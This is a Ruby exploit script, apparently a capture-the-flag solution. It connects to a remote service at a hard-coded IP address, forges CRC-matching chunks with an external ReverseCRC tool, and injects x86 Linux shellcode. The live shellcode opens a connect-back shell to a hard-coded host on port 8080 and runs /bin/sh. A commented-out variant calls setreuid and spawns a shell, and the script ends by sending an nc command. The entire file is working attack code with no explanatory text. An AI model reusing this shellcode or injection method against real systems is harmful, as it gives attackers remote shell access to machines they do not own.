require 'socket'
require 'zlib'
#encoding: BINARY
#shellcode = "\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80\xeb\xfe"
shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x8f\xf8\x02\x4f\x68\x02\x00\x1f\x90\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
shellcode += "\x00" * (4 - shellcode.length % 4)
shellcode = shellcode.unpack('<I*')

#s = TCPSocket.new('localhost', 5757)
s = TCPSocket.new('54.178.232.195', 5757)
random = s.readline()[6..-2]
puts "salt : " + random
salt =  random.scan(/../).map{|v| v.to_i(16).chr}.join
start_crc = Zlib::crc32(salt).to_s(16)

Thread.new do |x|
	loop do 
		puts s.readline()
	end
end

data = ""

length = shellcode.length
s.write([length].pack('<I'))

shellcode.each do |x|
	x = `./ReverseCRC #{start_crc} #{x.to_s(16)}`
	s.write("\x04\x00\x00\x00")
	data = x.scan(/../).map{|v| v.to_i(16).chr}.join
	s.write(data)
end

s.puts("nc 0.0.0.0 8080")
sleep(10)
